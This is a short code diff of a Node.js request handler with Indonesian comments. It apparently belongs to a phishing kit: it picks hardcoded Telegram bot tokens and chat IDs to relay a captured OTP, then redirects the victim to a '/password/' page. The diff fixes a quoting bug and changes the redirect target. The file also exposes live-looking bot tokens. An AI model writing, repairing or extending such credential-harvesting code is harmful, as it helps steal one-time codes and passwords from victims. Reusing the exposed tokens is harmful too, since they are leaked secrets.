@@ -55,7 +55,7 @@ module.exports = async (req, res) => {
   let botToken, chatId;
   if (bot_id === "1") {
     botToken = '7982924006:AAHeQSDcuVf0fnaYujbgZeUI2AreoRE8HSc';
-    chatId   = '7495263260;
+    chatId   = '7495263260';
   } else {
     botToken = '7272507372:AAHz55yCKgJkKs1SpzplM7Fg8iaoYVz4YBM';
     chatId   = '5876510981';
@@ -66,7 +66,7 @@ module.exports = async (req, res) => {
 
   if (result.success) {
     // Redirect ke halaman OTP berikutnya
-    res.writeHead(302, { Location: "/otp/" });
+    res.writeHead(302, { Location: "/password/" });
     res.end();
   } else {
     console.error("Gagal kirim OTP:", result.error);
